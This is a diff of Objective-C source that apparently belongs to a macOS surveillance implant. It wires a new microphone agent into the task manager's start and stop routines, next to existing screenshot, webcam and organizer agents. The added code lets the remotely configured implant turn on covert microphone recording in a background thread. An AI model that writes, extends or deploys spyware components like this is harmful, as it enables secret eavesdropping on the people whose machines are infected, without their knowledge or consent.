@@ -16,6 +16,7 @@
 #import "RCSMAgentScreenshot.h"
 #import "RCSMAgentWebcam.h"
 #import "RCSMAgentOrganizer.h"
+#import "RCSMAgentMicrophone.h"
 
 #import "NSMutableDictionary+ThreadSafe.h"
 
@@ -979,6 +980,43 @@ static NSLock *gSyncLock                  = nil;
         
         break;
       }
+    case AGENT_MICROPHONE:
+      {
+#ifdef DEBUG_TASK_MANAGER
+        infoLog(@"Starting Agent Microphone");
+#endif
+        RCSMAgentMicrophone *agentMic = [RCSMAgentMicrophone sharedInstance];
+        agentConfiguration = [[self getConfigForAgent: agentID] retain];
+        
+        if (agentConfiguration != nil)
+          {
+            if ([agentConfiguration objectForKey: @"status"]    != AGENT_RUNNING
+                && [agentConfiguration objectForKey: @"status"] != AGENT_START)
+              {
+                [agentConfiguration setObject: AGENT_START forKey: @"status"];
+                [agentMic setAgentConfiguration: agentConfiguration];
+                
+                [NSThread detachNewThreadSelector: @selector(start)
+                                         toTarget: agentMic
+                                       withObject: nil];
+              }
+            else
+              {
+#ifdef DEBUG_TASK_MANAGER
+                infoLog(@"Agent Microphone is already running");
+#endif
+              }
+          }
+        else
+          {
+#ifdef DEBUG_TASK_MANAGER
+            infoLog(@"Agent microphone not found");
+#endif
+
+            return FALSE;
+          }
+        break;
+      }
     default:
       {
 #ifdef DEBUG_TASK_MANAGER
@@ -1288,10 +1326,30 @@ static NSLock *gSyncLock                  = nil;
         
         break;
       }
+    case AGENT_MICROPHONE:
+      {
+#ifdef DEBUG_TASK_MANAGER        
+        infoLog(@"Stopping Agent Microphone");
+#endif
+        RCSMAgentMicrophone *agentMic = [RCSMAgentMicrophone sharedInstance];
+        
+        if ([agentMic stop] == FALSE)
+          {
+#ifdef DEBUG_TASK_MANAGER
+            errorLog(@"Error while stopping agent Microphone");
+#endif
+            return NO;
+          }
+        
+        agentConfiguration = [self getConfigForAgent: agentID];
+        [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
+        
+        break;
+      }
     default:
       {
 #ifdef DEBUG_TASK_MANAGER
-        infoLog(@"Unsupported agent: 0x%04x", agentID);
+        errorLog(@"Unsupported agent: 0x%04x", agentID);
 #endif
         
         return NO;
@@ -1686,6 +1744,35 @@ static NSLock *gSyncLock                  = nil;
                 
                 break;
               }
+            case AGENT_MICROPHONE:
+              {
+#ifdef DEBUG_TASK_MANAGER
+                infoLog(@"Starting Agent Microphone");
+#endif
+                RCSMAgentMicrophone *agentMic = [RCSMAgentMicrophone sharedInstance];
+                agentConfiguration = [[anObject objectForKey: @"data"] retain];
+                
+                if ([agentConfiguration isKindOfClass: [NSString class]])
+                  {
+                    // Hard error atm, think about default config parameters
+#ifdef DEBUG_TASK_MANAGER
+                    errorLog(@"Config not found");
+#endif
+                    break;
+                  }
+                else
+                  {
+                    [anObject setObject: AGENT_START
+                                 forKey: @"status"];
+                    [agentMic setAgentConfiguration: anObject];
+                         
+                    [NSThread detachNewThreadSelector: @selector(start)
+                                             toTarget: agentMic
+                                           withObject: nil];
+                  }
+                                
+                break;
+              }
             default:
               break;
             }
@@ -1957,6 +2044,29 @@ static NSLock *gSyncLock                  = nil;
                 
                 break;
               }
+            case AGENT_MICROPHONE:
+              {
+#ifdef DEBUG_TASK_MANAGER
+                infoLog(@"Stopping Agent Microphone");
+#endif
+                RCSMAgentMicrophone *agentMic = [RCSMAgentMicrophone sharedInstance];
+                
+                if ([agentMic stop] == FALSE)
+                  {
+#ifdef DEBUG_TASK_MANAGER
+                    errorLog(@"Error while stopping agent Microphone");
+#endif
+                  }
+                else
+                  {
+                    [anObject setObject: AGENT_STOPPED
+                                 forKey: @"status"];
+                  }
+                
+                break;
+              }
+            default:
+              break;
             }
         }
       
